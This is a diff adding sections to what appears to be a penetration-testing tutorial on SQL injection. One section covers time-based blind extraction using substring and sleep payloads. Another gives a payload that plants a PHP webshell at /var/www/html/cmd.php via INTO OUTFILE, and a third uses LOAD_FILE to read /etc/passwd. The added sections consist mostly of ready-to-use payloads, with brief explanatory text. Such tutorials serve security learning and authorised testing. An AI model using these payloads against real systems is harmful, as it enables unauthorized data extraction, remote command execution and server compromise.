@@ -100,3 +100,29 @@ We can also extract the table name from `information_schema`:
 We can take a look at the database to see what the query it will look like:
 
 <figure><img src="../.gitbook/assets/error-based-sqli-10.png" alt=""><figcaption></figcaption></figure>
+## SQL Injection Time Based Blind
+
+Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used. To exploit it we can use `substring` function to test each character and check it that query returns true (it will wait for 3 seconds), if true, we can confirm the first character and we will do with the next one and so on.
+
+ ```
+' or 1=1 union select 1, 2, if(substring((select database()), 1, 1)="l", sleep(3), NULL), 4, 5, 6; #
+
+' or 1=1 union select 1, 2, if(substring((select database()), 2, 1)="a", sleep(3), NULL), 4, 5, 6; #
+
+' or 1=1 union select 1, 2, if(substring((select database()), 3, 1)="b", sleep(3), NULL), 4, 5, 6; #
+```
+
+## Webshell
+
+Quando encontramos uma falha de SQL Injection, também conseguimos gravar uma webshell dentro do servidor e ganhar um acesso.
+
+```
+' or 1=1 union select 1, 2, "<?php system($_GET['cmd']); ?>", 4, 5, 6 into outfile "/var/www/html/cmd.php"; #
+```
+
+## Reading file
+
+```
+' or 1=1 union select 1, 2, LOAD_FILE('/etc/passwd'), 4, 5, 6; #
+```
+
